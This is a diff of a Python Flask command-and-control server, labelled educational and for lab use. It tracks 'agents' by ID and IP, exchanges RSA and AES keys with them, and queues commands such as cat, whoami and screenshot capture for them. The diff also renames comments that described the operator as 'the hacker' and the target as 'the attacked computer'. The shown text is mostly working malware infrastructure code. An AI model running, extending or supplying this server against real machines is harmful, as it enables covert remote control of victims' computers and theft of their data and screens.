@@ -1,27 +1,15 @@
-import os, sys
+import base64, datetime,os, time,queue,threading,socket,argparse,sys
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "shared"))
-from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG
-import encryptions,PROTOCOLS,OPERATIONS
 # ---- end path bootstrap ----
-import base64
-import datetime
-import os
-import time
+import encryptions,PROTOCOLS,OPERATIONS
+from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG,SERVER_LOG
 from flask import Flask, jsonify, request, render_template_string
-import queue
-import threading
-import socket
 from loguru import logger
-import argparse
 from log_setup import setup_logging
 
-# all the possible commands for the agents
-COMMANDS = {'cat','dir','whoami','SCREENSHOT','SEND_IMG'}
-
-# Initialize the Flask application
 app = Flask(__name__)
 users_in_server = {}
-admin_responses = []
+
 # Define a GET route for the home/root URL- default rooting - just for homepage
 @app.route('/', methods=['GET'])
 def home():
@@ -41,59 +29,45 @@ def get_keys():
     if agent_id in users_in_server:
         users_in_server[agent_id]['last_seen'] = str(datetime.datetime.now())
     else:
-        logger.debug("first time of the agent at the server")
-        users_in_server[agent_id] = {'aes_key':"" , 'ip_addr':f"{request.remote_addr}", "is_encrypted":False , 'last_seen':f'{str(datetime.datetime.now())}'}
+        logger.debug(f"first time of the agent {agent_id} at the server")
+        users_in_server[agent_id] = {'aes_key':"" , 'ip_addr':f"{request.remote_addr}",
+                  "is_encrypted":False , 'last_seen':f'{str(datetime.datetime.now())}'}
     logger.debug(request)
     logger.debug(request.data)
     logger.debug(request.headers)
     data = request.get_json(silent=True)
-    logger.debug("thtts the thing before data")
-    #the data should be empty in the keys replace
-    logger.debug("that the thing after data")
-    logger.debug("got beacon from agent 2")
     #if there is  something at queue but still not encrypted - it may be public key / N
-    if q.qsize() != 0 and users_in_server[agent_id]['is_encrypted'] == False:
+
+    if users_in_server[agent_id]['is_encrypted'] == False:
         logger.debug("1")
-        return str(q.get()), 200
-    elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == False:
-        return "empty", 200
+        return jsonify({"public_key": str(public_key), "N": str(N)}), 200
+   # elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == False:
+     #   return "empty", 200
 
 
 @app.route('/getkeys', methods=['POST'])
 def handle_json2():
-    #thr agent sending content
+    #the agent sending content
     # Parse incoming JSON payload
-    logger.info("the agent send his aes key")
+    logger.info("the agent sent his aes key")
     agent_id = request.headers.get('Agent-Id')
     data = request.get_json(silent=True)
     logger.debug(request)
     logger.debug(request.get_data())
     logger.debug(request.method)
     logger.debug(request.headers)
-    logger.debug("the  data from client is : ")
-    logger.debug(data)
     #we recieve the aes key int str, but is actually an int which represent bytes!!
     encrypted_aes = data.get('aes_key_int')
     #decrypt the aes key by the int version
     aes_key_by_client = encryptions.decrypt_with_private_key(N,int(encrypted_aes),privateKey)
-    logger.info(f"server || the length of the aes client that got by client is {len(str(aes_key_by_client))} and type is {type(aes_key_by_client)}")
     aes_key_str = aes_key_by_client.to_bytes(16,'little')
-    logger.info(f"the aes key in bytes is: {str(aes_key_str)} and length is {len(str(aes_key_str))}")
     # we save the aes key in bytes
     users_in_server[agent_id]['aes_key'] = str(aes_key_by_client)
     users_in_server[agent_id]['is_encrypted'] = 'True'
-    logger.info(f"the last aes key is : {aes_key_by_client}")
-
     if not data:
         return jsonify({"error": "No JSON data provided"}), 400
     else:
         return jsonify({"msg":"success"}),200
-
-    # Return a structured JSON response
-    return jsonify({
-        "status": "success",
-        "received": data
-    }), 200
 
 
 @app.route('/getcommands', methods=['POST'])
@@ -193,7 +167,6 @@ def admin_ui():
 @app.route('/api/status', methods=['GET'])
 def get_status():
     image_data = None
-
     # 1. בודקים אם קובץ התמונה ששמרת ב-Socket אכן קיים
     if OUTPUT_IMG.exists():
         try:
@@ -228,9 +201,9 @@ def send_command_api():
 def run_http_server(host,port):
  app.run(debug=False, host=host, port=port)
 
-#a function which get commands by the hacker, stores them at the server queue - and when
-# its ok - it send the command to the client (attacked computer)
-def get_command_byClient(queue):
+#a function which get commands by the admin, stores them at the server queue - and when
+# its ok - it send the command to the agent
+def send_commands_to_agent(queue):
  while True:
      logger.debug(users_in_server)
      #specifie the command for each agent (client)
@@ -243,11 +216,12 @@ def get_command_byClient(queue):
      else:
          logger.info("encryption not ready yet / no user in the system")
 
-def queue_mode(q):
+def monitor_server_state(q):
  while True:
      time.sleep(10)
      logger.debug(list(q.queue))
      logger.debug(users_in_server)
+
 
 #-----------------------------------------------------------------------
 #set encryption numbers:
@@ -259,15 +233,7 @@ privateKey = encryptions.generate_private_key(public_key,totienty)
 
 #set the queue to have the N , public_key at the beginning (as commands)
 q = queue.Queue()
-#-----------------------------------------------------------------------
-
-protocoled_public_key = int("1" + str(public_key))
-protocoled_N = int("2" + str(N))
-q.put(protocoled_public_key)
-q.put(protocoled_N)
-logger.info(f"the server has created the queue and inserted both public key, N")
-logger.info(f"the protocoled publickey is :{protocoled_public_key}")
-logger.info(f"the protocoled N is :{protocoled_N}")
+commands_queue = queue.Queue()
 #-----------------------------------------------------------------------
 def parse_args():
     p = argparse.ArgumentParser(description="HTTP C2 server (educational, lab use only)")
@@ -275,13 +241,21 @@ def parse_args():
     p.add_argument("--port", type=int, default=5050, help="Port to listen on")
     return p.parse_args()
 
-
 def main():
-    setup_logging()
+    # all the possible commands for the agents
+    COMMANDS = {'cat', 'dir', 'whoami', 'SCREENSHOT', 'SEND_IMG'}
+
+    # Initialize the Flask application
+    global users_in_server
+    global admin_responses
+    admin_responses = []
+
+    setup_logging(str(SERVER_LOG))
     args = parse_args()
+
     t1 = threading.Thread(target=run_http_server, args=(args.host, args.port))
-    t2 = threading.Thread(target=get_command_byClient, args=(q,))
-    t3 = threading.Thread(target=queue_mode, args=(q,))
+    t2 = threading.Thread(target=send_commands_to_agent, args=(q,))
+    t3 = threading.Thread(target=monitor_server_state, args=(q,))
     t1.start()
     time.sleep(1)
     t2.start()
